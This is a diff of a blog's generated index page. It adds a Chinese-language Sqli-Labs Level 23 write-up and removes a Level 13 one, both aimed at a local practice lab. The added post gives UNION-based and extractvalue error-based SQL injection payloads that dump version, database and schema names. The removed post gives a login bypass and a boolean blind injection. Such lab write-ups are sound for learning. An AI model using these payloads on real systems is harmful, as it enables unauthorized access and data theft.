@@ -69,6 +69,59 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sqli-labs23" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/06/sqli-labs23/" class="article-date">
+  <time datetime="2020-04-06T05:53:02.798Z" itemprop="datePublished">2020-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/06/sqli-labs23/">Sqli-Labs-Level23学习</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="level-23"><a href="#level-23" class="headerlink" title="level-23"></a>level-23</h1><p>创建日期 星期六 24 十一月 2018</p>
+<p><a href="http://127.0.0.1/sql/Less-23/" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-23/</a><br><a href="http://127.0.0.1/sql/Less-23/index.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-23/index.php?id=1</a></p>
+<p><a href="http://127.0.0.1/sql/Less-23/index.php?id=-1%27%20union%20select%201,@@version,%273" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-23/index.php?id=-1%27%20union%20select%201,@@version,%273</a></p>
+<p>.\pasted_image.png</p>
+<p><a href="http://127.0.0.1/sql/Less-23/index.php?id=-1%27%20union%20select%201,database(),%273" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-23/index.php?id=-1%27%20union%20select%201,database(),%273</a></p>
+<p>.\pasted_image001.png</p>
+<p>127.0.0.1/sql/Less-23/index.php?id=1’ or extractvalue(1,concat(0x7e,(select database()),0x7e)) or ‘1’=’1</p>
+<p>.\pasted_image002.png</p>
+<p>127.0.0.1/sql/Less-23/index.php?id=-1’ union select 1,(select group_concat(schema_name)from information_schema.schemata),’3</p>
+<p>.\pasted_image003.png</p>
+<p>其他语句以此类推。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs23/" data-id="ck8o2c3bs00178ch5ft2m6ykh" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sqli-labs22" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/04/06/sqli-labs22/" class="article-date">
@@ -511,57 +564,6 @@
 
 
   
-    <article id="post-sqli-labs13" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/04/06/sqli-labs13/" class="article-date">
-  <time datetime="2020-04-06T05:44:30.264Z" itemprop="datePublished">2020-04-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/06/sqli-labs13/">Sqli-Labs-Level13学习</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h1><p>创建日期 星期日 18 十一月 2018</p>
-<p><a href="http://127.0.0.1/SQL/Less-13/index.php" target="_blank" rel="noopener">http://127.0.0.1/SQL/Less-13/index.php</a></p>
-<p>用户名admin’)#，密码任意，成功登录。</p>
-<p>.\pasted_image.png</p>
-<p>提交uname=admin’) and left(database(),1)&gt;’s’#&amp;passwd=1&amp;submit=Submit</p>
-<p>得到当为s时，返回<br>.\pasted_image001.png</p>
-<p>得到第一位为s,依次类推。</p>
-<p>uname=admin’) and left(database(),2)&gt;’se’#&amp;passwd=1&amp;submit=Submit<br>得到第二位为e</p>
-<p>uname=admin’) and left(database(),3)&gt;’sec’#&amp;passwd=1&amp;submit=Submit<br>得到第三位为c</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs13/" data-id="ck8o2c3b300068ch5b58i5c7r" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -619,6 +621,10 @@
       <ul>
         
           <li>
+            <a href="/2020/05/10/picoctfweb4/">picoCTF-WriteUp-A Simple Question</a>
+          </li>
+        
+          <li>
             <a href="/2020/05/10/picoctfweb3/">picoCTF-WriteUp-Secure Logon</a>
           </li>
         
@@ -632,10 +638,6 @@
         
           <li>
             <a href="/2020/05/05/sqli-labs45/">Sqli-Labs-Level45学习</a>
-          </li>
-        
-          <li>
-            <a href="/2020/05/05/sqli-labs44/">Sqli-Labs-Level44学习</a>
           </li>
         
       </ul>
